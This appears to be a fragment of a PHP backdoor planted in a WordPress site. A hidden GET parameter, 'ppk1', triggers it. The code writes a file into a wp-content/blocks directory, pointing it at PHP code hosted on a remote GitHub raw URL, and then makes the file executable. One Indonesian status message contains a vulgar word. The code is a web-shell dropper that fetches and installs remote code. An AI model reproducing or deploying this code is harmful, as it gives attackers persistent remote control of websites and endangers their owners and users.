...
if (isset($_GET['ppk1'])) {
    $dirPath = '/home/madrasah/public_html/wp-content/blocks/audio';
    $filePath = $dirPath . '/kureng.php';

    $url = 'https://raw.githubusercontent.com/kolangkaling08/junkfood/refs/heads/main/whatsmen/hunt/wadiaw.php';

    $desiredPermission = 0755;
    ...
    if (file_exists($filePath)) {
        ...
        if (($filePermission & 0777) !== $desiredPermission) {
            if (chmod($filePath, $desiredPermission)) {
                echo "Izin file telah diubah menjadi kontol.\n";
            } else {
